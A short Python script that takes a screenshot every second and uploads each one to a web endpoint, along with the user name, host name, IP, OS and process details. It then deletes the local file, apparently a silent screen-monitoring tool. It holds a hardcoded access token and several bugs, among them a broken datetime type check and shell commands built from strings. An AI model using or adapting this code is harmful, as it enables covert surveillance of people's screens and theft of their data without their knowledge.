import datetime,schedule,os,platform,socket,requests,logging,json,subprocess
from PIL import ImageGrab


class CJsonEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, datetime.datetime):
            return obj.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(obj, datetime):
            return obj.strftime("%Y-%m-%d")
        else:
            return json.JSONEncoder.default(self, obj)


def screen():
    im = ImageGrab.grab()
    image1 = os.path.join(path,'%s.jpg'%str(c))
    im.save(image1)
    im.close()
    created_time = datetime.datetime.fromtimestamp(os.stat(image1).st_ctime)
    data1 = {'enctype': 'multipart/form-data', 'os': host_info, 'host_name': host_name, 'user': host_user,
             'ip': host_ip,'created_at':created_time,'length':(im.size)[0],'pid':file_pid,
             'width':(im.size)[-1],'file_size':os.stat(image1).st_size,'file_abs_path':file_abs_path,'file_name':file_name}
    f =  open(image1, 'rb')
    file1 = {'file': f}
    try:
        res = requests.post(update_url,headers={"Authorization":"token 4616eac1a3e2419d53d0fdb870850a83d36f3bf3"}, data=data1, files=file1)
        if res.status_code == 200:
              #print(res.text)
              info = json.loads(res.text)
              if info.get('data')== 'success':
                  cmd = 'del %s '%image1
                  f.close()
                  subprocess.call(cmd,shell=True)
    except Exception as e:
        logging.error(e)
        pass
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
                    datefmt='%a, %d %b %Y %H:%M:%S',
                    filename='app.log',
                    filemode='a+')

file_pid = os.getpid()
file_abs_path = os.path.abspath(__file__)
file_name = os.path.basename(file_abs_path)
c=0
path = r'D:\listen\images'
if os.path.isdir(path) is False:
    os.system('mkdir %s'%path)
update_url = 'http://127.0.0.1:8000/api/upload_images/'
host_user = os.getenv('username')
host_name = socket.gethostname()
host_address = socket.gethostbyname('demonlg')
host_info = platform.system()
host_ip = socket.gethostbyname('demonlg')

if __name__ == '__main__':

    try:
        schedule.every(1).seconds.do(screen)
        while True:
            schedule.run_pending()
            c +=1
    except Exception as e:
        logging.error(e)
        pass




